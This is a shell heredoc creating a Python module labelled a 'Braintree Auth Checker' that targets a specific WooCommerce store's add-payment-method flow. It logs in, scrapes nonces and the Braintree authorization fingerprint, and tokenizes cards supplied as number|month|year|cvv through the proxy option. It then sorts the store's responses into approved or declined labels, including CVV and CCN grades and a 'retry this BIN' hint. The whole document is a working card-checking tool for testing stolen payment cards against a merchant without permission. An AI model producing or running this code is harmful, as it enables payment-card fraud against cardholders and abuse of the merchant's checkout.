cat > braintree.py << 'ENDOFFILE'
# ═══════════════════════════════════════════════════════════
#  Braintree Auth Checker - Core Module
#  Domain: kaffn8.com
# ═══════════════════════════════════════════════════════════

import requests
import re
import base64
import asyncio
import traceback
from typing import Optional, Dict

DOMAIN = "kaffn8.com"
BASE_URL = f"https://www.{DOMAIN}"

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
SEC_CH_UA = '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"'


def classify_response(text: str) -> Dict[str, str]:
    if not text:
        return {"status": "Error", "response": "Empty response"}
    try:
        m = re.search(r'Reason: (.*?)\s*</li>', text)
        msg = m.group(1) if m else ""

        if 'risk_threshold' in text:
            return {"status": "Declined", "response": "RISK: Retry this BIN later."}
        if 'You cannot add a new payment method so soon after the previous one' in text:
            return {"status": "Declined", "response": "Please wait for 20 seconds."}
        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
            return {"status": "Approved", "response": "1000: Approved"}
        if 'Duplicate card exists in the vault.' in msg:
            return {"status": "Approved", "response": "Approved"}
        if ("avs: Gateway Rejected: avs" in msg
            or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in msg
            or "cvv: Gateway Rejected: cvv" in msg):
            return {"status": "Approved", "response": "1000: Approved"}
        if "Invalid postal code" in msg or "CVV." in msg:
            return {"status": "Approved", "response": "Approved(CVV)"}
        if "Card Issuer Declined CVV" in msg:
            return {"status": "Approved", "response": "Approved (CCN)"}
        if msg:
            return {"status": "Declined", "response": msg}
        return {"status": "Error", "response": "error in gate"}
    except:
        return {"status": "Error", "response": "error in gate"}


def _sync_check(card, email, password, proxy=None, timeout=60, debug=False):
    parts = card.split('|')
    if len(parts) != 4:
        return {"status": "Error", "response": "Invalid card format"}
    number, exp_m, exp_y, cvv = parts
    if len(exp_y) == 2:
        exp_y = '20' + exp_y
    proxies_dict = {"http": proxy, "https": proxy} if proxy else None

    def dbg(*a):
        if debug: print(*a)

    try:
        s = requests.session()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG', 'cache-control': 'max-age=0', 'priority': 'u=0, i',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none',
            'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': UA,
        }
        response = s.get(f'{BASE_URL}/my-account/', headers=headers, proxies=proxies_dict, timeout=timeout)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not m:
            return {"status": "Error", "response": "No login nonce"}
        login_nonce = m.group(1)
        dbg("[1] OK")

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG', 'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': f'https://www.{DOMAIN}', 'priority': 'u=0, i',
            'referer': f'https://www.{DOMAIN}/my-account/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': UA,
        }
        data = {'username': email, 'password': password, 'woocommerce-login-nonce': login_nonce,
                '_wp_http_referer': '/my-account/', 'login': 'Log in'}
        response = s.post(f'{BASE_URL}/my-account/', headers=headers, data=data, proxies=proxies_dict, timeout=timeout)
        dbg("[2] OK")

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG', 'cache-control': 'max-age=0', 'priority': 'u=0, i',
            'referer': f'https://www.{DOMAIN}/my-account/add-payment-method/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': UA,
        }
        response = s.get(f'{BASE_URL}/my-account/add-payment-method/', headers=headers, proxies=proxies_dict, timeout=timeout)
        c1 = re.search(r'client_token_nonce":"([^"]+)"', response.text)
        c2 = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not c1 or not c2:
            return {"status": "Error", "response": "No nonce found"}
        client_nonce = c1.group(1)
        add_nonce = c2.group(1)
        dbg("[3] OK")

        headers = {
            'accept': '*/*', 'accept-language': 'ar-EG',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://www.{DOMAIN}', 'priority': 'u=1, i',
            'referer': f'https://www.{DOMAIN}/my-account/add-payment-method/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
        response = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies_dict, timeout=timeout)
        mero = response.json()['data']
        lol = base64.b64decode(mero).decode('utf-8')
        me = re.findall(r'"authorizationFingerprint":"(.*?)"', lol)[0]
        dbg("[4] OK")

        headers = {
            'accept': '*/*', 'accept-language': 'ar-EG',
            'authorization': f'Bearer {me}', 'braintree-version': '2018-05-10',
            'content-type': 'application/json', 'origin': f'https://www.{DOMAIN}',
            'priority': 'u=1, i', 'referer': f'https://www.{DOMAIN}/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site',
            'user-agent': UA,
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9b2a3828-b06a-4aff-8379-43a6b66096d8'},
            'query': 'query ClientConfiguration { clientConfiguration { merchantId environment clientApiUrl } }',
            'operationName': 'ClientConfiguration',
        }
        requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies_dict, timeout=timeout)
        dbg("[5] OK")

        headers = {
            'accept': '*/*', 'accept-language': 'ar-EG',
            'authorization': f'Bearer {me}', 'braintree-version': '2018-05-10',
            'content-type': 'application/json', 'origin': f'https://www.{DOMAIN}',
            'priority': 'u=1, i', 'referer': f'https://www.{DOMAIN}/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site',
            'user-agent': UA,
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9b2a3828-b06a-4aff-8379-43a6b66096d8'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': number, 'expirationMonth': exp_m, 'expirationYear': exp_y, 'cvv': cvv}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies_dict, timeout=timeout)
        tokens = response.json()['data']['tokenizeCreditCard']['token']
        dbg("[6] OK")

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG', 'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': f'https://www.{DOMAIN}', 'priority': 'u=0, i',
            'referer': f'https://www.{DOMAIN}/my-account/add-payment-method/',
            'sec-ch-ua': SEC_CH_UA, 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': UA,
        }
        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'visa'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', tokens),
            ('wc_braintree_device_data', '{"correlation_id":"0229affb-db6e-450f-bb8c-e571312f"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"0229affb-db6e-450f-bb8c-e571312f"}'),
            ('wc-braintree-paypal-context', 'shortcode'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'USD'),
            ('wc_braintree_paypal_locale', 'en_us'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', add_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]
        response = s.post(f'{BASE_URL}/my-account/add-payment-method/', headers=headers, data=data, proxies=proxies_dict, timeout=timeout)
        dbg("[7] OK")
        return classify_response(response.text)

    except requests.exceptions.ProxyError:
        return {"status": "Error", "response": "Proxy error"}
    except requests.exceptions.Timeout:
        return {"status": "Error", "response": "Timeout"}
    except Exception as e:
        if debug:
            traceback.print_exc()
        return {"status": "Error", "response": str(e)[:100]}


async def check_card(card: str, email: str, password: str,
                     proxy: Optional[str] = None,
                     timeout: int = 60,
                     debug: bool = False) -> Dict[str, str]:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        None, _sync_check, card, email, password, proxy, timeout, debug
    )
ENDOFFILE
